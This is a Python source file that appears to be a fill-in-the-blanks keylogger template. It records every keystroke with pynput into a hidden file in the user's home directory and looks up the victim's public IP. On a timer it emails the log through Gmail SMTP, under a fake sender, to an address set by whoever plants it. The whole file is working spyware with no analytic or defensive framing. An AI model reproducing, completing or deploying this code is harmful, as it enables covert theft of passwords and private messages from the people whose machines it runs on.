from pynput import keyboard
import smtplib, os
from datetime import datetime
from time import sleep
from threading import Thread
from requests import get
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email.mime.text import MIMEText
from email.utils import COMMASPACE, formatdate
from email import encoders
from sys import platform
YOUR_EMAIL = '$EMAIL'
YOUR_PASSWORD = '$PASSWORD'
EMAIL_TO_SEND = '$SEND'
LABEL = '$LABEL'
WAITING = $WAITING
ip = get("https://api.ipify.org").content.decode()
file = 	os.path.expanduser("~/.log.txt")
with open(file, "a") as f:
    pass
if platform in ['Windows', 'win32', 'cygwin']:
    os.system("attrib +h " + file)
def addToSend(key):
    with open(file, "a", encoding="UTF-8") as f:
        f.write(key)
def on_press(key):
    key = str(key)
    good = [["Key.space", " "],["Key.enter", "[Ent]\n"],["Key.shift", "[Sh]"],["Key.insert", "[Ins]"],["Key.backspace", "[Bck]"],["Key.alt_l", "[Alt L]"],["Key.alt_r", "[Alt R]"],["Key.ctrl_l", "[Ctrl L]"],["Key.ctrl", "[Ctrl]"],["Key.ctrl_r", "[Ctrl R]"],["Key.caps_lock", "[Caps]"],["Key.down", "[Down Arrow]"],["Key.right", "[Right Arrow]"],["Key.left", "[Left Arrow]"],["Key.up", "[Up Arrow]"],["Key.shift_r", "[Shift R]"],["Key.shift_l", "[Shift L]"],["Key.tab", "[Tab]"],["", ""]]
    for i in range(len(good)):
        if good[i][0] == key:
            key = good[i][1]
            break
    if key != "\"'\"":
        key = key.replace("'", "")
    elif key == "\"'\"":
        key = key.replace('"', "")
    addToSend(key)
def send_mail(your_email, send_to, password, file, label, ip, waiting):
    while 1:
        sleep(waiting)
        if os.stat(file).st_size != 0:
            server = "smtp.gmail.com"
            port = 587
            local_time = str(datetime.now())
            msg = MIMEMultipart()
            msg['From'] = "anonymous@anonymous.com"
            msg['To'] = COMMASPACE.join(send_to)
            msg['Date'] = formatdate(localtime=True)
            msg['Subject'] = ip + " " + label + " " + local_time
            msg.attach(MIMEText(label))
            part = MIMEBase('application', "octet-stream")
            with open(file, 'rb') as file_:
                part.set_payload(file_.read())
            encoders.encode_base64(part)
            part.add_header('Content-Disposition','attachment; filename="{}"'.format(os.path.basename(ip + " " + label + " " + local_time + ".txt")))
            msg.attach(part)
            smtp = smtplib.SMTP(server, port)
            smtp.starttls()
            smtp.login(your_email, password)
            smtp.sendmail("anonymous@anonymous.com", send_to, msg.as_string())
            smtp.quit()
            f = open(file, 'w')
            f.close()
keyboard.Listener(on_press=on_press).start()
Thread(target=send_mail, args=(YOUR_EMAIL, EMAIL_TO_SEND, YOUR_PASSWORD, file, LABEL, ip, WAITING)).start()
